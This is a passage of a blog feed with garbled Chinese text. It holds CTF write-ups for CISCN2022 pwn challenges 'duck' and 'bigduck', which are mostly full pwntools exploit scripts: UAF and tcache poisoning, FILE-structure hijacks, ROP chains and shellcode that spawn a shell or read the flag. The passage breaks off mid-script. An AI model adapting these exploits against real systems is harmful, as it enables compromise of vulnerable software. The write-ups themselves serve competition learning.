class="hljs-number">0x401350</span> <span class="hljs-comment"># mov rax, [rbp+s];leave;ret;</span><br>len_rax_mprotect = <span class="hljs-number">0x4012D0</span> <span class="hljs-comment"># len = 0x1000 addr = rax mprotect</span><br><span class="hljs-comment"># sea(&quot;please input your filename\n&quot;,&#x27;/bin/sh\0&#x27;.ljust(0x20,&#x27;\0&#x27;)+&#x27;\x00&#x27;+&#x27;\0&#x27;*0x13+p64(0x404010))</span><br>sea(<span class="hljs-string">&quot;please input your filename\n&quot;</span>,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\0&#x27;</span>*(<span class="hljs-number">0x1c</span>-<span class="hljs-number">8</span>)+p64(addr)+p64(addr+<span class="hljs-number">0x18</span>)+p64(rax_leave_ret))<br>shellcode = asm(<br>  <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  push 0</span><br><span class="hljs-string">  pop rax</span><br><span class="hljs-string">  xchg rdi,rsi</span><br><span class="hljs-string">  xchg rdi,rdx</span><br><span class="hljs-string">  push 0</span><br><span class="hljs-string">  pop rdi</span><br><span class="hljs-string">  syscall</span><br><span class="hljs-string">  &#x27;&#x27;&#x27;</span><br>)<br>payload = p64(<span class="hljs-number">0x3fe000</span>) <span class="hljs-comment"># rax</span><br>payload = payload.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>payload += p64(len_rax_mprotect) + p64(<span class="hljs-number">0</span>) + p64(addr+<span class="hljs-number">0x38</span>) + shellcode<br>sea(<span class="hljs-string">&quot;please input your new data\n&quot;</span>,payload)<br><br>sleep(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># sl(&#x27;\0&#x27;*0x546+asm(shellcraft.cat(&#x27;./flag&#x27;,fd=2)))</span><br><span class="hljs-comment"># sl(&#x27;\0&#x27;*0x546+asm(shellcraft.write(2,&#x27;rsp&#x27;,&#x27;0x50&#x27;)))</span><br>sl(<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x546</span>+asm(shellcraft.sh()))<br>sleep(<span class="hljs-number">2</span>)<br>sl(<span class="hljs-string">&#x27;exec 1&gt;&amp;0&#x27;</span>)<br>sleep(<span class="hljs-number">2</span>)<br>sl(<span class="hljs-string">&#x27;cat flag&#x27;</span>)<br>p.interactive()<br><br><br></code></pre></td></tr></table></figure><p>ä»€ä¹ˆï¼Œä½ è¯´å¤ç°å“ªå»äº†ï¼Ÿåœ¨å­¦äº†åœ¨å­¦äº†ã€‚ï¼ˆæ¶¦</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2022 åä¸œåŒ—èµ›åŒº Pwn Writeup</title>
    <link href="/posts/2c3848ae.html"/>
    <url>/posts/2c3848ae.html</url>
    
    <content type="html"><![CDATA[<p>Pwn éš¾åº¦ä¸å¤§ï¼Œè‰è‰åœ°akäº†ï¼Œæœ€åä¹Ÿæ˜¯æ“¦è¾¹è¿›äº†å†³èµ›ï¼Œè¿˜æ˜¯æ¯”è¾ƒæœ‰æƒŠæ— é™©çš„ã€‚<s>ä½†æ˜¯ğŸ‘´å¤§é›¾å¥½åƒè¦ğŸ”äº†ï¼ŒğŸ‘´ä¸‹å»å¥½å¥½åæ€åæ€ã€‚</s>ï¼ˆç„¶è€Œæ²¡æœ‰ï¼‰å¦å¤–è¿™å°å¯çˆ±æ¯”èµ›Pwnå…¨åšäº†ç®—ä¸Šå‰ä¸‰çš„åŠ æˆğŸ‘´ä¹Ÿå°±1200+30+30+60ï¼Œæ„Ÿè§‰ä¸å¦‚éš”å£å–è¯ä¸€é¢˜1200+360ã€‚</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220624170308020.png" alt="image-20220624170308020" style="zoom: 50%;" /><h2 id="duck"><a class="header-anchor" href="#duck">Â¶</a>duck</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220619194732802.png" alt="image-20220619194732802"></p><p><strong>flag{693edf4763ef4cdd4f152794028b7f5e}</strong></p><p>libc 2.34 ä¸‹çš„ pwn é¢˜ï¼Œç»™çš„æ¼æ´æ¯”è¾ƒåŸºç¡€å°±æ˜¯ <strong>UAF</strong>ï¼ŒåŒæ—¶ç»™äº† Edit åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆç®€å•çš„ getshellã€‚</p><p><strong>æ€è·¯</strong></p><ol><li>åˆ©ç”¨ UAF leak å †åœ°å€ï¼Œåˆ†é…å¹¶ Dele æ‰å¤šä¸ªå †å— leak libc</li><li>åˆ†é… chunk åˆ° Tcache çš„ entry å¤„ï¼Œåˆ©ç”¨ Edit å‡½æ•°æˆ‘ä»¬å¯ä»¥æ§åˆ¶ä»»æ„åˆ†é…å †å—</li><li>ä¿®æ”¹æ‰ stderr çš„ flag ä¸º <code>/bin/sh\0</code></li><li>ä¿®æ”¹æ‰ <code>_IO_file_jumps</code> é‡Œçš„å‡½æ•°æŒ‡é’ˆä¸º <code>system</code> ï¼Œæœ€åæ”¹æ‰ Top Chunk çš„ size è¿›å…¥ <code>_IO_fflush</code> è§¦å‘ getshellã€‚</li></ol><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;192.168.166.147&#x27;</span>,<span class="hljs-number">58013</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    menu(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data,size=<span class="hljs-number">0x100</span></span>):<br>    menu(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&#x27;Content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><br>add()<br>dele(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_leak = uu64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>))<br>heap_base = heap_leak &lt;&lt;<span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add() <span class="hljs-comment"># 9</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>+<span class="hljs-number">8</span>):<br>    dele(i)<br>show(<span class="hljs-number">8</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1f2cc0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br><br>stderr = libc_base + <span class="hljs-number">0x1f3680</span><br>helper = libc_base + <span class="hljs-number">0x1f45c0</span><br><br>edit(<span class="hljs-number">7</span>,p64(heap_leak^(heap_base+<span class="hljs-number">0x100</span>)))<br>add() <span class="hljs-comment"># 11</span><br><span class="hljs-comment"># pause()</span><br>add() <span class="hljs-comment"># 12</span><br>edit(<span class="hljs-number">12</span>,p64(stderr)*<span class="hljs-number">2</span>)<br>lg(<span class="hljs-string">&#x27;ADDR&#x27;</span>,(heap_base+<span class="hljs-number">0x100</span>))<br>add() <span class="hljs-comment"># 13</span><br>edit(<span class="hljs-number">13</span>,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>)<br>edit(<span class="hljs-number">12</span>,p64(helper)*<span class="hljs-number">2</span>)<br>add()<br>edit(<span class="hljs-number">14</span>,p64(system_addr))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    edit(<span class="hljs-number">12</span>,p64(heap_base+<span class="hljs-number">0xd30</span>)*<span class="hljs-number">2</span>)<br>    add()<br>    edit(<span class="hljs-number">15</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br><br>add()<br>add()<br>add()<br><br><span class="hljs-comment"># add()</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="bigduck"><a class="header-anchor" href="#bigduck">Â¶</a>bigduck</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220619194814107.png" alt="image-20220619194814107"></p><p><strong>flag{afae47ead2452a4b5ba629ec88635a51}</strong></p><p>libc 2.33 ä¸‹å¼€äº†æ²™ç›’çš„å †é¢˜ï¼Œå…¶ä»–éƒ¨åˆ†å’Œä¸Šé¢˜ä¸€æ ·ã€‚</p><p><strong>æ€è·¯</strong></p><ol><li>åˆ©ç”¨ UAF leak å †åœ°å€ï¼Œåˆ†é…å¹¶ Dele æ‰å¤šä¸ªå †å— leak libc</li><li>åˆ†é… chunk åˆ° Tcache çš„ entry å¤„ï¼Œåˆ©ç”¨ Edit å‡½æ•°æˆ‘ä»¬å¯ä»¥æ§åˆ¶ä»»æ„åˆ†é…å †å—</li><li>House of kiwi å®Œæˆæ ˆè¿ç§»ï¼Œæ‰§è¡Œ shellcode è¯»å– flag</li></ol><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;192.168.166.147&#x27;</span>,<span class="hljs-number">58011</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    menu(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data,size=<span class="hljs-number">0x100</span></span>):<br>    menu(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&#x27;Content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><br>add()<br>dele(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_leak = uu64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>))<br>heap_base = heap_leak &lt;&lt;<span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add() <span class="hljs-comment"># 9</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>+<span class="hljs-number">8</span>):<br>    dele(i)<br>edit(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;u&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>edit(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br><br>stderr = libc_base + <span class="hljs-number">0x1f3680</span><br>sync = libc_base + <span class="hljs-number">0x1e24a0</span> + <span class="hljs-number">0x60</span><br>magic = libc_base + <span class="hljs-number">0x529ad</span><br>helper = libc_base + <span class="hljs-number">0x1e1940</span><br>ret = libc_base + <span class="hljs-number">0x0000000000026699</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>rdx = libc_base + <span class="hljs-number">0x00000000000c7f32</span><br>addr = heap_base + <span class="hljs-number">0x400</span><br><br>mmp = flat([<br>    <span class="hljs-number">0</span>,rdi,((addr)&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span>,rsi,<span class="hljs-number">0x2000</span>,rdx,<span class="hljs-number">7</span>,libc.sym.mprotect,rdi,<span class="hljs-number">0</span>,rsi,addr+<span class="hljs-number">0x400</span>,rdx,<span class="hljs-number">0x100</span>,libc.sym.read,libc_base + <span class="hljs-number">0x00000000000506b1</span><br>])<br><br>edit(<span class="hljs-number">0</span>,mmp)<br><span class="hljs-comment"># edit(1,mmp)</span><br><br>edit(<span class="hljs-number">7</span>,p64(heap_leak^(heap_base+<span class="hljs-number">0x100</span>)))<br>add() <span class="hljs-comment"># 11</span><br><span class="hljs-comment"># pause()</span><br>add() <span class="hljs-comment"># 12</span><br>edit(<span class="hljs-number">12</span>,p64(helper)*<span class="hljs-number">2</span>)<br>lg(<span class="hljs-string">&#x27;ADDR&#x27;</span>,(heap_base+<span class="hljs-number">0x100</span>))<br>add() <span class="hljs-comment"># 13</span><br>edit(<span class="hljs-number">13</span>,p64(heap_base+<span class="hljs-number">0x2a8</span>)+p64(ret))<br>edit(<span class="hljs-number">12</span>,p64(sync)*<span class="hljs-number">2</span>)<br>add()<br>edit(<span class="hljs-number">14</span>,p64(magic))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    edit(<span class="hljs-number">12</span>,p64(heap_base+<span class="hljs-number">0xd30</span>)*<span class="hljs-number">2</span>)<br>    add()<br>    edit(<span class="hljs-number">15</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br><br>add()<br>add()<br>add()<br><br><span class="hljs-comment"># # add()</span><br>sleep(<span class="hljs-number">2</span>)<br>sl(asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>p.interactive()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x0000000000028a55 : pop rdi ; ret</span><br><span class="hljs-string">0x0000000000112a51 : pop rdx ; pop r12 